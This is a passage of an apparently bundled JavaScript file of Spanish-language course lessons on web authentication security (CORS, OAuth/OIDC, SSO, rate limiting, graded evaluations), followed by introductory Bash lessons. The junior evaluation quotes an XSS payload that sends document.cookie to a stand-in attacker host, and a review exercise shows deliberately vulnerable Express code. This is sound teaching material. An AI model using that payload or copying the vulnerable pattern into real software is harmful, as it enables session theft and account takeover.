*   **Helmet.js (para Node):** Una librera que configura automticamente headers como \`X-Content-Type-Options: nosniff\` (evita que el navegador adivine el tipo de archivo) y \`Content-Security-Policy\` (CSP) para evitar scripts maliciosos.

## 4. CORS (Cross-Origin Resource Sharing)
No uses \`Access-Control-Allow-Origin: *\` en produccin. Define una lista blanca exacta de qu dominios pueden hablar con tu API.

---

### Caso Real de Error:
Una app de citas permita ver la ubicacin exacta de los usuarios. La API devolva la latitud y longitud con 6 decimales. Aunque el mapa mostraba un rea general, un hacker consumi la API directamente y pudo localizar a cualquier persona con un margen de error de un metro.

### Ejercicio Prctico 14:
Analiza el endpoint \`/api/user/update-profile\`. Recibe un objeto JSON con los cambios. Cmo evitaras que un usuario cambie su campo \`balance\` (dinero en cuenta) enviando \`{ "balance": 99999 }\` en la peticin de actualizacin de su nombre?
`,completed:!1},{id:"auth-security-15-auth-spa-errores",title:"Auth en SPAs y Manejo de Errores de Seguridad",level:"semi-senior",content:`# Leccin 15: Auth en SPAs y Manejo de Errores de Seguridad

En las aplicaciones de una sola pgina (React, Next.js, Vue), el manejo de la autenticacin tiene desafos nicos de UX y seguridad.

## 1. El flujo de Login en una SPA
A diferencia de una web vieja donde el servidor te rediriga, en una SPA el estado se maneja en el cliente.
1.  **Login:** El frontend enva datos y recibe una Cookie HttpOnly (Recomendado) o un Access Token.
2.  **Estado:** Guardamos en el estado global (Redux, Context, Pinia) que el usuario est \`isLoggedIn: true\`.
3.  **Persistencia:** Al recargar la pgina, el frontend debe verificar inmediatamente si la sesin sigue siendo vlida llamando a un endpoint \`/api/me\`.

## 2. Manejo de Errores "Silenciosos"
Un Semi-Senior sabe que los errores de auth deben manejarse con elegancia.
*   **401 Unauthorized:** El usuario no est logueado o su token expir. El frontend debe intentar un \`/refresh\` automticamente antes de echar al usuario al Login.
*   **403 Forbidden:** El usuario est logueado pero **no tiene permiso**. No lo mandes al Login, mustrale una pantalla de "No tienes permisos de administrador".

## 3. Seguridad en el Manejo de Errores
Cuidado con los mensajes de error del servidor.
*   **Incorrecto:** \`Error: Internal Server Error. Database table 'users' not found.\` (Fuga de informacin de la estructura del servidor).
*   **Correcto:** \`Error: No se pudo procesar la solicitud. Contacte a soporte (Ref ID: 550e).\` Registra el error real en tus logs privados, no lo enves al navegador.

## 4. Auditora de Seguridad (Logs)
Debes registrar eventos crticos para detectar ataques:
*   Login exitoso y fallido (con IP).
*   Cambios de contrasea.
*   Cambios en permisos de administrador.
*   Uso de tokens revocados.

---

### Casos de Error en SPAs:
Un programador guarda el estado de "Administrador" solo en el frontend (\`isAdmin = true\`). Un usuario abre la consola del navegador, cambia esa variable manualmente y desbloquea el botn de "Borrar Todo". Si el backend no vuelve a validar el permiso al recibir el clic, el sistema ha fallado.

### Ejercicio Prctico 15:
Imagina que el token del usuario expira mientras est completando un formulario muy largo. 
1. Cmo disearas el flujo para que el usuario no pierda lo que escribi? 
2. Cmo haras el "Silent Refresh" para que el usuario ni siquiera sepa que su token expir?
`,completed:!1},{id:"auth-security-16-ejercicios-auth-semi-senior",title:"Autenticacin Semi-Senior",level:"semi-senior",content:`# Ejercicios Tcnicos: Autenticacin Semi-Senior

Desafa tus conocimientos aplicando soluciones robustas a problemas de la vida real.

---

## Ejercicio 1: El Middleware de Autorizacin Universal
**Contexto:** Tienes una API con muchos roles (User, Editor, Admin, Moderator).
**Consigna:**
*   Escribe una funcin (middleware) que acepte una lista de permisos requeridos.
*   La funcin debe leer los permisos del usuario desde su token o sesin.
*   Si el usuario tiene AL MENOS UNO de los permisos requeridos, deja pasar.
*   Si no, devuelve un error 403 con un mensaje claro.

**Resultado esperado:** Poder usarlo as: \`router.post('/noticia', hasPermissions(['create_post', 'admin']), controller)\`.

---

## Ejercicio 2: Flujo de Recuperacin (Password Reset)
**Contexto:** Un usuario olvid su clave.
**Consigna:** Describe el flujo de base de datos para generar un token de reset seguro.
1. Cmo guardas el token en la DB? (Texto plano o hash?).
2. Cmo aseguras que el token solo sirva una vez?
3. Cmo aseguras que el token expire en 30 minutos?
4. Escribe el algoritmo lgico (pasos) para el endpoint \`/api/reset-password\` que recibe el token y la nueva clave.

---

## Ejercicio 3: Prevencin de BOLA (Broken Object Level Auth)
**Contexto:** Endpoint \`GET /api/facturas/:id\`.
**Consigna:** 
*   Escribe la lgica necesaria para evitar que el \`Usuario A\` vea la factura del \`Usuario B\` simplemente cambiando el ID en la URL.
*   Qu pasa si el \`Usuario A\` es un \`Administrador\`? Cmo cambia tu lgica?

---

## Ejercicio 4: Silent Refresh con Interceptor
**Contexto:** El Access Token del usuario dura 5 minutos.
**Consigna:** 
*   Escribe el pseudocdigo para un "Interceptor" de Axios (o Fetch) en el frontend.
*   Si una peticin recibe un error 401, el interceptor debe "pausar" las peticiones futuras, llamar a \`/api/refresh\`, actualizar el token y re-intentar la peticin original.

---

A resolver! Un profesional Semi-Senior se destaca por el manejo de casos de borde y situaciones de error.  
`,completed:!1,isProject:!0},{id:"auth-security-17-oauth-oidc",title:"OAuth 2.0 y OpenID Connect (OIDC)",level:"senior",content:`# Leccin 17: OAuth 2.0 y OpenID Connect (OIDC)

Como Arquitecto Senior, ya no diseas solo un "login", diseas un ecosistema de identidad. OAuth 2.0 y OIDC son los estndares que permiten que las aplicaciones confen entre s sin compartir contraseas.

## 1. El gran malentendido: OAuth vs OIDC
Es comn escuchar que se usan indistintamente, pero sus propsitos son diferentes:
*   **OAuth 2.0 (Delegacin de Autorizacin):** Permite que una aplicacin acceda a recursos en nombre de un usuario. Es el protocolo de la "Llave de Valet". Me das permiso para estacionar tu auto, pero no para entrar a tu casa.
*   **OpenID Connect (Capa de Identidad):** Es una capa construida sobre OAuth 2.0 que aade la **Autenticacin**. Proporciona el "ID Card" del usuario (el ID Token).

## 2. Los Flujos (Grant Types) que debes dominar
En produccin, no todos los flujos son seguros.
*   **Authorization Code Flow with PKCE:** El estndar de oro para SPAs y Apps mviles. Evita que un atacante intercepte el cdigo de autorizacin.
*   **Client Credentials:** Para comunicacin Machine-to-Machine (M2M) entre microservicios.
*   **Implicit Flow:** **OBSOLETO.** No lo uses en nuevos desarrollos debido a fallos de seguridad en la entrega del token por URL.

## 3. Roles en OAuth 2.0
1.  **Resource Owner:** El usuario.
2.  **Client:** Tu aplicacin.
3.  **Authorization Server:** El encargado de validar y emitir tokens (ej: Auth0, Keycloak, OKTA).
4.  **Resource Server:** Tu API que protege los datos.

## 4. Pregunta de Entrevista Senior:
*"Dime la diferencia entre un Access Token y un ID Token. Puedo usar un Access Token para identificar a un usuario en mi frontend?"*
**Respuesta Pro:** No. El ID Token es para el cliente (frontend) y contiene informacin del perfil del usuario. El Access Token es para el Resource Server (API) y contiene los permisos (scopes). Usar un Access Token para identidad es un fallo de seguridad comn.

---

### Escenario de Produccin:
Ests diseando un sistema donde tu web necesita leer los contactos de Google del usuario.
1.  Qu flujo de OAuth elegiras?
2.  Cmo manejaras el almacenamiento del \`client_secret\` en una aplicacin React (Pista: No se puede, necesitas un Backend for Frontend).
`,completed:!1},{id:"auth-security-18-sso-tokens-avanzados",title:"SSO (Single Sign-On) y Seguridad Avanzada en Tokens",level:"senior",content:`# Leccin 18: SSO (Single Sign-On) y Seguridad Avanzada en Tokens

El Single Sign-On (SSO) permite que un usuario se autentique una vez y acceda a mltiples aplicaciones independientes. Para un Arquitecto, esto implica manejar la confianza entre dominios.

## 1. Estrategias de Identidad Centralizada
*   **Central Authentication Service (CAS):** Un servidor nico que maneja todas las sesiones.
*   **SAML (Security Assertion Markup Language):** El estndar de la vieja escuela (basado en XML) usado principalmente en entornos corporativos (Active Directory).
*   **OIDC (Basado en JWT):** El estndar moderno para web y nube.

## 2. JWS, JWE y JWK (La familia JOSE)
Un Senior no solo habla de JWT, conoce los estndares que lo soportan:
*   **JWS (JSON Web Signature):** La estructura del token firmado que ya conocemos.
*   **JWE (JSON Web Encryption):** El token est **encriptado**, no solo firmado. Solo el destinatario con la llave privada puede ver el contenido. Vital para datos hiper-sensibles.
*   **JWK (JSON Web Key):** Un formato para compartir llaves pblicas. Permite que tus microservicios verifiquen tokens automticamente preguntando al servidor de identidad por sus llaves actuales.

## 3. Seguridad Crtica: Token Binding y DPoP
Un gran problema de los tokens es que son "Bearer Tokens" (quien lo tenga, tiene el poder).
*   **DPoP (Demonstrating Proof-of-Possession):** Un estndar nuevo que vincula el JWT a una llave criptogrfica privada que reside en el dispositivo del usuario. Si un hacker roba el token, no puede usarlo desde su mquina porque no tiene la llave vinculada.

## 4. Pregunta de Entrevista Senior:
*"Nuestra empresa tiene 10 microservicios. Cmo implementaras el Logout global? Si un usuario cierra sesin en una app, cmo invalidamos su acceso en las otras 9 instantneamente?"*
**Respuesta Pro:** Discutira el uso de **Back-channel Logout** (notificaciones entre servidores) vs **Front-channel Logout** (iframes ocultos) vs el uso de una **Blacklist distribuida en Redis** con propagacin de eventos.

---

### Desafo Tcnico:
Investiga qu es un **Sidecar de Seguridad** en una arquitectura de Kubernetes. Por qu es mejor que el microservicio verifique el token por s mismo?
`,completed:!1},{id:"auth-security-19-rate-limiting-resiliencia",title:"Rate Limiting de Produccin y Resiliencia",level:"senior",content:`# Leccin 19: Rate Limiting de Produccin y Resiliencia

Un sistema seguro en papel puede caerse en produccin bajo un ataque coordinado. El Arquitecto Senior disea para la guerra (alta carga y ataques).

## 1. Algoritmos de Rate Limiting
No todos los lmites son iguales:
*   **Fixed Window:** El ms simple. 100 peticiones por minuto. El problema: si mandan 100 en el segundo 59 y 100 en el segundo 61, el sistema recibe rfagas.
*   **Sliding Window Log/Counter:** Ms preciso para evitar rfagas, pero ms pesado en memoria.
*   **Token Bucket:** Permite rfagas cortas pero mantiene un promedio constante. Ideal para APIs que quieren ser "generosas" pero seguras.

## 2. Implementacin Distribuida
En una arquitectura multi-servidor, el rate limiting no puede ser local a cada instancia.
*   **Redis es el estndar:** Se usa un contador atmico en Redis para que todas las instancias del API compartan el mismo lmite por usuario/IP.

## 3. Web Application Firewall (WAF)
Como Senior, delegas la seguridad de red a herramientas especializadas.
*   **Cloudflare / AWS WAF:** Bloquean ataques de inyeccin, DDoS y bots antes de que toquen tu servidor.
*   **Proteccin de API Keys:** Si expones una API pblica, debes implementar cuotas, niveles de servicio (Tiering) y rotacin automtica de llaves.

## 4. Auditora y Monitoreo (SIEM)
No puedes reaccionar a lo que no ves.
*   **Logs Estructurados:** Los logs deben estar en formato JSON para que herramientas como ElasticStack (ELK) o Splunk puedan analizarlos en tiempo real.
*   **Alertas de Anomala:** Necesitas una alerta si la tasa de logins fallidos sube un 200% en 5 minutos. Eso no es un error de usuario, es un ataque de relleno de credenciales (Credential Stuffing).

---

### Caso Crtico Real:
Una plataforma de streaming fue atacada. El hacker us millones de combinaciones de usuarios/claves robadas de otra web. Como cada peticin vena de una IP diferente (proxy), el rate limiting por IP fall.
**Solucin Senior:** Implementar "Device Fingerprinting" y rate limiting por tasa de error global en el endpoint de login.

### Desafo Profesional:
Cmo implementaras un sistema que bloquee a un usuario pero solo para acciones de "Escritura" (POST/PUT/DELETE) mientras le permite seguir leyendo datos (GET) si sospechas de una actividad fraudulenta?
`,completed:!1},{id:"auth-security-20-errores-diseno-estrategia",title:"Errores de Diseo que Matan Corporaciones",level:"senior",content:`# Leccin 20: Errores de Diseo que Matan Corporaciones

En el nivel Senior, el error no es un bug de cdigo, es una falla de diseo arquitectnico. Analicemos las catstrofes reales para no repetirlas.

## 1. Almacenamiento Inseguro de Secretos
*   **Error:** Guardar la llave privada de firma de JWT o las API keys de servicios externos en el \`config.json\` o variables de entorno del servidor.
*   **Diseo Senior:** Uso de un **Secret Manager** (HashiCorp Vault, AWS Secrets Manager, Google Secret Manager). Las llaves se inyectan en tiempo de ejecucin y rotan automticamente.

## 2. Dependencia de Terceros sin Fallback
*   **Error:** Tu app solo permite login con Google. Google cae (ha pasado). Tu negocio muere por horas.
*   **Diseo Senior:** Estrategia de **Identidad Hbrida**. Siempre ofrece una forma de entrar propia o mltiples proveedores de identidad.

## 3. Falta de "Defense in Depth" (Defensa en profundidad)
Confiaste en que el firewall bloqueaba todo y no hasheaste las claves con mucha fuerza. El firewall fall y el atacante entr a una zona "confiable".
*   **Principio Senior:** Asume que cada capa de tu cebolla de seguridad puede fallar. Si el hacker llega a la DB, las claves deben ser intiles (Hashing fuerte + Pepper en HSM). Si roba un token, debe ser intil fuera de la red (DPoP).

## 4. El peligro de la "Seguridad por Oscuridad"
*   **Error:** Pensar que porque tu API no est documentada, nadie la encontrar.
*   **Realidad:** Existen herramientas de escaneo automtico que mapean todas tus rutas en segundos. Disea siempre asumiendo que el atacante conoce el 100% de tu cdigo.

## 5. El error del "Token de Admin" eterno
*   **Error:** Tener tokens de sistema para tareas automticas que no expiran nunca. Su robo es una sentencia de muerte para la infraestructura.
*   **Diseo Senior:** Tokens de acceso de muy corta vida para servicios, renovados mediante identidades de mquina (Workload Identity).

---

### Pregunta de Entrevista Final:
*"Si tuvieras que elegir entre invertir $50,000 en mejorar el sistema de hashing de contraseas o en implementar un WAF de ltima generacin, sobre qu base tomaras la decisin?"*
**Respuesta Senior:** Evaluando el **Modelo de Amenazas**. Nuestra mayor amenaza es la filtracin de datos persistentes (DB) o la denegacin de servicio y el scraping (Red)? Un Senior decide basndose en Riesgo vs Costo vs Impacto.

---

### Misin Final Senior:
Realiza un **Audit de Seguridad** de tu proyecto actual. No busques solo "si la clave es fuerte". Busca:
1. Cmo se rotan las llaves?
2. Qu pasa si el servidor de identidad no responde?
3. Cmo detectamos un comportamiento anmalo que no sea fuerza bruta?

Felicidades, Arquitecto! Has completado el camino de la seguridad. 
`,completed:!1},{id:"auth-security-ejercicios-senior",title:"Desafos de Arquitectura de Seguridad",level:"senior",content:`# Ejercicios Senior: Desafos de Arquitectura de Seguridad

En este nivel los ejercicios no son de cdigo, son de diseo y toma de decisiones crticas.

---

## Desafo 1: El Dilema del Banco Global
**Contexto:** Un banco est migrando de una aplicacin monoltica a microservicios. Tienen 50 aplicaciones diferentes (web y mobile).
**Consigna:**
1. Propn una arquitectura de **SSO** que permita al usuario moverse entre todas las apps.
2. Explica cmo manejaras la **Propagacin de Identidad** entre un microservicio A y un microservicio B si el servicio B necesita saber qu usuario origin la peticin.
3. Propn una estrategia para **invalidar una sesin** en los 50 servicios si se detecta un fraude en tiempo real.

---

## Desafo 2: Resiliencia ante Ataques de Relleno (Credential Stuffing)
**Contexto:** Tu sitio recibe 1 milln de intentos de login por hora, todos probando combinaciones de emails y claves robadas de otros sitios. El rate limiting por IP no funciona porque usan redes botnet.
**Consigna:**
*   Disea un sistema de deteccin basado en "Heursticas". Qu datos miraras para decidir si bloqueas una peticin sin afectar a usuarios reales? (Pista: Headers de navegador, velocidad de escritura, tasa de error por cuenta).

---

## Desafo 3: El Almacn de Secretos
**Contexto:** Tu equipo guarda las llaves de AWS y la DB en un archivo \`.env\` que por error fue subido a un Repositorio Privado de GitHub.
**Consigna:**
1. Cul es el protocolo de emergencia inmediato para mitigar el riesgo?
2. Disea la solucin definitiva para que los desarrolladores no necesiten ver las llaves reales en su entorno local pero la app pueda funcionar.

---

## Desafo 4: Auditora Forense
**Contexto:** Se detect que un administrador "fantasma" borr registros de auditora el mes pasado. No hay rastro de quin fue.
**Consigna:**
*   Cmo redisearas tu sistema de logs para que sean **Inmutables**? (Es decir, que ni siquiera un administrador con acceso total pueda borrarlos o editarlos sin dejar rastro).

---

Arquitecto, presenta tus soluciones! Recuerda que en seguridad no existe el "100% seguro", solo el "suficientemente difcil para el atacante". 
`,completed:!1,isProject:!0},{id:"auth-security-evaluacion-junior",title:"Autenticacin y Seguridad (Junior)",level:"junior",content:`# Evaluacin Tcnica: Autenticacin y Seguridad (Junior)

Esta evaluacin mide tu comprensin de los pilares de la seguridad web y tu capacidad para evitar errores de principiante en la gestin de usuarios.

---

## 1. Parte Terica: Conceptos Fundamentales
1.  **AuthN vs AuthZ:** Ests diseando un foro. El sistema verifica que eres "Pedro" mediante tu contrasea. Luego, intentas borrar un post que escribi "Mara" y el sistema te lo impide. Explica en qu momento ocurri la **Autenticacin** y en qu momento la **Autorizacin**.
2.  **Hashing:** Por qu usamos un **Salt** al hashear una contrasea? Qu pasara si dos usuarios eligen la misma contrasea "123456" y no usamos Salt?

## 2. Ejercicio Prctico: El Flujo del Secreto
Describe paso a paso (en una lista o pseudocdigo) qu debe hacer tu servidor de backend cuando recibe una peticin de **Login** con un email y una contrasea.
*   *Restriccin:* Menciona explcitamente qu funcin de la base de datos usas y qu funcin de la librera de seguridad usas.

## 3. Desafo Real: El Bug de XSS
Un atacante publica un comentario en tu sitio web que dice: \`<script>fetch('https://malvado.com/steal?c=' + document.cookie)<\/script>\`.
1.  Si tu sitio guarda el identificador de sesin en una cookie normal, qu acaba de pasar?
2.  Cmo arreglas este problema desde el servidor (menciona el flag de la cookie)?

## 4. Anlisis de Caso: UX vs Seguridad
Recibes un reporte de que el mensaje de error de tu App dice: *"Usuario no encontrado en la base de datos"*.
1.  Por qu esto es una vulnerabilidad?
2.  Propn el mensaje de error definitivo que sea seguro pero til para el usuario.

---

## Criterios de Aprobacin
*   **Identificacin (40%):** Diferencia sin errores Autenticacin de Autorizacin.
*   **Implementacin (30%):** Describe el flujo de hashing y comparacin correctamente.
*   **Mitigacin (30%):** Identifica el riesgo de XSS y propone el uso de cookies HttpOnly.

*Nota: Para aprobar, no debes haber sugerido en ningn momento guardar contraseas en texto plano o en LocalStorage.* 
`,completed:!1,isProject:!0},{id:"auth-security-evaluacion-semi-senior",title:"Autenticacin y Seguridad (Semi-Senior)",level:"semi-senior",content:`# Evaluacin Tcnica: Autenticacin y Seguridad (Semi-Senior)

Como desarrollador con experiencia, se espera que disees sistemas resistentes a ataques automatizados y manejes sesiones de forma profesional.

---

## 1. Parte Terica: Sesiones Escalables
1.  **Refresh Tokens:** Explica el concepto de **Rotacin de Refresh Tokens (RTR)**. Cmo ayuda esto a detectar si un token ha sido robado por un atacante?
2.  **CORS:** Por qu \`Access-Control-Allow-Origin: *\` es una mala prctica en una API que maneja autenticacin por cookies?

## 2. Ejercicio Prctico: Review de Cdigo
Analiza este fragmento de cdigo (Node.js/Express) y encuentra al menos **2 errores de seguridad**:

\`\`\`javascript
app.put('/api/user/update', async (req, res) => {
  const { id, ...data } = req.body;
  // El usuario logueado en la sesin es req.user.id
  await User.update(data, { where: { id: id } }); 
  res.send({ message: 'Perfil actualizado' });
});
\`\`\`
*Consigna:* Explica el riesgo de cada error y escribe la versin corregida.

## 3. Desafo Real: El Logout Global
Un usuario reporta que le robaron el celular donde tena abierta la sesin de tu App.
1.  Si usas **JWT (Stateless)**, cmo invalidas ese token inmediatamente antes de que expire?
2.  Propn una arquitectura usando **Redis** para manejar una "Blacklist" de tokens revocados.

## 4. Diseo de Permisos (RBAC)
Disea el esquema lgica para un sistema de **Google Drive** simple.
*   Roles: \`Owner\`, \`Editor\`, \`Viewer\`.
*   Cmo validaras que un usuario que intenta borrar un archivo es efectivamente el \`Owner\`? (Menciona la validacin a nivel de objeto).

---

## Criterios de Aprobacin
*   **Seguridad de API (30%):** Identifica vulnerabilidades de BOLA (Broken Object Level Auth) y Mass Assignment.
*   **Manejo de Tokens (40%):** Disea flujos de renovacin y revocacin de tokens.
*   **Autorizacin (30%):** Propone un sistema de permisos jerrquico y validacin de propiedad de recursos.

*Nota: Se valorar la capacidad de proponer soluciones que contemplen el uso de Redis o bases de datos para estados de sesin.*  
`,completed:!1,isProject:!0},{id:"auth-security-evaluacion-senior",title:"Arquitectura de Seguridad (Senior)",level:"senior",content:`# Evaluacin Tcnica: Arquitectura de Seguridad (Senior)

Esta evaluacin se centra en la estrategia, el cumplimiento de estndares internacionales y la resiliencia sistmica.

---

## 1. Parte Terica: Protocolos de Identidad
1.  **OIDC vs OAuth 2.0:** Tu empresa quiere implementar un sistema de "Login con LinkedIn". Qu protocolo se encarga de darte el nombre y email del usuario y cul se encarga de darte permiso para publicar en su muro?
2.  **PKCE:** Por qu el flujo de OAuth 2.0 "Implicit Flow" est obsoleto y por qu PKCE es la solucin tcnica para SPAs?

## 2. Ejercicio de Diseo: El Sistema de Microservicios
Tienes 10 microservicios. Un usuario se loguea en el \`Auth-Service\`.
1.  Cmo propagas la identidad del usuario a los otros 9 servicios de forma segura y performante?
2.  Cmo manejas la **Rotacin de Llaves Pblicas (JWKS)** para que los servicios puedan verificar tokens sin preguntar al servidor de Auth en cada peticin?

## 3. Desafo Real: Ataque de Credential Stuffing
Tu plataforma de e-commerce est bajo un ataque coordinado: 5,000 bots estn probando contraseas robadas de otros sitios contra tu DB.
1.  El Rate Limiting por IP falla porque usan proxies. Qu otras mtricas usaras para detectar el ataque?
2.  Cmo implementaras un sistema de **Adaptive Auth** (ej: pedir 2FA solo si el login parece sospechoso)?

## 4. Estrategia y tica: La Vulnerabilidad 0-Day
Ves un error de diseo en el CORE de tu sistema de autenticacin que permitira entrar a cualquier cuenta de administrador. El plazo de lanzamiento es en 2 horas. El CEO dice que "lancemos igual y lo fijamos despus".
1.  Cul es tu defensa tcnica y tica ante esta situacin?
2.  Cmo documentaras el riesgo en un reporte de arquitectura formal?

---

## Criterios de Aprobacin Senior
*   **Dominio de Estndares (40%):** Conoce a fondo OAuth 2.0, OIDC y las especificaciones de seguridad de tokens.
*   **Resiliencia Sistmica (30%):** Disea sistemas que fallan de forma segura (Fail-safe) y escalan.
*   **Liderazgo Tcnico (30%):** Capacidad de priorizar la seguridad sobre la velocidad de entrega y justificar decisiones ante stakeholders.

*Misin: El sistema no debe ser solo seguro, debe ser auditable, monitoreable y resiliente.* 
`,completed:!1,isProject:!0}]},c1={id:"bash",title:"Bash y Terminal Scripting",description:"Domina la lnea de comandos de Linux y Unix para automatizar tareas, gestionar servidores y potenciar tu productividad como desarrollador.",completed:!1,track:"Especializacin para Desarrolladores",lessons:[{id:"bash-01-intro-bash",title:"Qu es Bash y por qu la Terminal es tu mejor amiga?",level:"junior",content:`# Leccin 01: Qu es Bash y por qu la Terminal es tu mejor amiga?

Si quieres ser un desarrollador de lite, no puedes depender de hacer clic en botones. La Terminal (o consola) es donde ocurre la verdadera magia.

## 1. Qu es Bash?
**Bash** (Bourne Again SHell) es un lenguaje de comandos y un programa que interpreta lo que escribes para que la computadora lo ejecute. Es el estndar en Linux y macOS, y se usa en casi todos los servidores del mundo.

## 2. El Prompt: Tu punto de entrada
Cuando ves algo como \`user@computer:~$\`, la computadora te est diciendo: "Estoy lista, qu quieres hacer?".
*   \`~\`: Significa que ests en tu carpeta personal (Home).
*   \`$\`: Significa que eres un usuario normal. Si vieras \`#\`, seras el administrador (Root), ten cuidado!

## 3. Por qu aprenderlo?
*   **Velocidad:** Hacer tareas repetitivas en segundos.
*   **Servidores:** La mayora de los servidores no tienen una interfaz visual (ventanas), solo una terminal.
*   **Automatizacin:** Escribir un pequeo script que haga una tarea pesada por ti.

---

### Concepto Junior:
La terminal no es algo de "hackers" de las pelculas. Es simplemente otra herramienta para hablar con tu computadora de forma directa y potente.

### Ejercicio Mental 1:
Si tienes que renombrar 100 fotos de "vacaciones_1.jpg" a "foto_1.jpg", qu tardara ms: hacerlo a mano con el ratn o escribir una sola lnea de comando?
`,completed:!1},{id:"bash-02-navegacion-archivos",title:"Navegacin y Gestin de Archivos",level:"junior",content:"# Leccin 02: Navegacin y Gestin de Archivos\n\nPara moverte en Bash, necesitas tres comandos bsicos que usars 1,000 veces al da.\n\n## 1. Dnde estoy? (`pwd`)\n`pwd` (Print Working Directory): Te dice la ruta exacta de la carpeta donde ests parado.\n\n## 2. Qu hay aqu? (`ls`)\n`ls` (List): Te muestra los archivos y carpetas.\n*   `ls -l`: Muestra detalles (tamao, fecha).\n*   `ls -a`: Muestra archivos ocultos (los que empiezan con punto, como `.env`).\n\n## 3. Cmo me muevo? (`cd`)\n`cd` (Change Directory):\n*   `cd carpeta`: Entras a una carpeta.\n*   `cd ..`: Subes un nivel (vuelves atrs).\n*   `cd ~`: Vuelves a tu casa (Home).\n\n## 4. Crear y Borrar\n*   `mkdir nombre`: Crea una carpeta.\n*   `touch archivo.txt`: Crea un archivo vaco.\n*   `rm archivo.txt`: Borra un archivo (**Ojo!** No hay papelera de reciclaje, se borra para siempre).\n*   `cp`: Copia archivos.\n*   `mv`: Mueve o renombra archivos.\n\n---\n\n### Misin Junior:\nAprender a moverte por las carpetas de tu proyecto usando solo la terminal. Te har sentir mucho ms gil mientras programas.\n\n### Ejercicio Prctico 2:\nCrea una carpeta llamada `prueba`, entra en ella, crea un archivo llamado `hola.txt` y luego intenta borrar la carpeta un nivel arriba. (Pista: para borrar carpetas con contenido se usa `rm -rf`).\n",completed:!1},{id:"bash-03-pipes-redireccion",title:"El poder de las Tuberas (Pipes) y Redireccin",level:"junior",content:'# Leccin 03: El poder de las Tuberas (Pipes) y Redireccin\n\nEn Bash, los comandos no estn solos; pueden trabajar en equipo. Esta es la filosofa de Unix: "Haz una sola cosa y hazla bien, y permite que se conecte con otros".\n\n## 1. Redireccin de salida (`>`)\nPor defecto, los comandos muestran el resultado en la pantalla. Con `>` puedes enviarlo a un archivo.\n*   `ls > lista.txt`: Crea un archivo con el contenido de la carpeta.\n*   **Ojo:** `>` borra el archivo y escribe de nuevo. Si quieres agregar al final sin borrar, usa `>>`.\n\n## 2. Las Tuberas (`|`)\nEs el concepto ms potente de Bash. Toma la salida de un comando y la usa como entrada del siguiente.\n*   **Ejemplo:** `ls | grep "config"`\n    *   `ls` lista los archivos.\n    *   `|` se los pasa a `grep`.\n    *   `grep` filtra y solo muestra los que tienen la palabra "config".\n\n## 3. Ver contenido de archivos\n*   `cat`: Muestra todo el archivo de golpe.\n*   `head`: Muestra las primeras 10 lneas.\n*   `tail`: Muestra las ltimas 10 lneas (muy til para ver logs).\n*   `less`: Permite navegar por el archivo sin cargarlo todo en memoria.\n\n---\n\n### Concepto Junior:\nCombinar comandos pequeos te permite hacer bsquedas complejas. Imagina buscar un error especfico en un archivo de texto de 1 milln de lneas en un segundo. Con `grep` y `|`, es fcil.\n\n### Ejercicio Mental 3:\nSi tienes un archivo `logs.txt` y solo quieres ver las ltimas 5 lneas que contengan la palabra "ERROR", cmo combinaras los comandos que aprendiste?\n',completed:!1},{id:"bash-04-primer-script",title:"Tu primer Script (.sh)",level:"junior",content:`# Leccin 04: Tu primer Script (.sh)

Un script es simplemente un archivo de texto que contiene una lista de comandos que Bash ejecutar uno tras otro.

## 1. El Shebang (\`#!\`)
La primera lnea de cualquier script de Bash debe ser siempre:
\`\`\`bash
#!/bin/bash
\`\`\`
Esto le dice a la computadora: "Usa el programa Bash para leer este archivo".

## 2. Creando el script
1. Crea un archivo: \`touch miscript.sh\`.
2. Escribe adentro:
\`\`\`bash
#!/bin/bash
echo "Hola, estoy limpiando el proyecto..."
rm -rf tmp/*.log
echo "Limpieza terminada!"
\`\`\`

## 3. Permisos de ejecucin
Por seguridad, los archivos nuevos no se pueden ejecutar como programas. Tienes que darles permiso:
*   \`chmod +x miscript.sh\`

## 4. Correr el script
Ahora puedes correrlo escribiendo:
*   \`./miscript.sh\`

---

### Misin Junior:
Automatizar una tarea que haces siempre. Por ejemplo, crear la estructura de carpetas de un proyecto nuevo con un solo comando.

### Ejercicio Prctico 4:
Crea un script llamado \`saludo.sh\` que imprima tu nombre, el nombre de la carpeta donde ests (\`pwd\`) y la fecha actual (\`date\`). No olvides el Shebang y el \`chmod +x\`.
`,completed:!1},{id:"bash-05-practica-junior",title:"Bash Junior",level:"junior",content:`# Ejercicios y Evaluacin: Bash Junior

Demuestra que dominas la terminal antes de pasar a la automatizacin avanzada.

---

## 1. Ejercicio: El Inspector de Archivos
**Escenario:** Tienes una carpeta con mil archivos. Necesitas saber cuntos de ellos son archivos de configuracin (\`.conf\`).
*Consigna:* Qu comando usaras combinando \`ls\`, \`grep\` y \`wc -l\` (que cuenta lneas)?

## 2. Ejercicio: El Limpiador Automtico
**Escenario:** Siempre que terminas de trabajar, borras manualmente la carpeta \`temp\` y creas una nueva vaca para maana.
*Consigna:* Escribe las 3 lneas de cdigo de un script que haga esto por ti.

## 3. Evaluacin: Conceptos Base
*   Qu diferencia hay entre \`>\` y \`>>\` al redireccionar una salida a un archivo?
*   Para qu sirve el comando \`chmod +x\`?
*   Qu es el "Shebang" y en qu lnea del script debe ir?

---

### Criterios de Aprobacin
* [ ] Se mueve por carpetas sin usar el ratn.
* [ ] Entiende el flujo de datos entre comandos (Pipes).
* [ ] Puede crear y ejecutar scripts bsicos.

Felicidades! Has dejado de ser un usuario para empezar a ser un administrador de tu entorno. 
`,completed:!1,isProject:!0},{id:"bash-06-variables-argumentos",title:"Variables y Argumentos en Bash",level:"semi-senior",content:`# Leccin 06: Variables y Argumentos en Bash

Como Semi-Senior, tus scripts deben ser inteligentes y adaptarse a diferentes situaciones. Para eso necesitamos guardar datos.

## 1. Definir Variables
En Bash **no dejes espacios** alrededor del \`=\`.
*   **Bien:** \`NOMBRE="Octavio"\`
*   **Mal:** \`NOMBRE = "Octavio"\`

Para usar la variable, ponemos \`$\` adelante: \`echo "Hola $NOMBRE"\`.

## 2. Argumentos de entrada
Puedes pasarle datos a un script cuando lo ejecutas: \`./script.sh arg1 arg2\`.
*   \`$1\`: El primer argumento.
*   \`$2\`: El segundo argumento.
*   \`$@\`: Todos los argumentos juntos.
*   \`$#\`: Cuntos argumentos se pasaron.

## 3. Capturar la salida de un comando
Si quieres guardar lo que devuelve un comando en una variable, usa \`$()\`:
\`\`\`bash
FECHA=$(date)
echo "Hoy es $FECHA"
\`\`\`

---

### Lo que hace un Semi-Senior:
No escribe rutas fsicas fijas (Hardcoded). Usa variables para que el script funcione correctamente si cambias de carpeta o de computadora.

### Ejercicio 6:
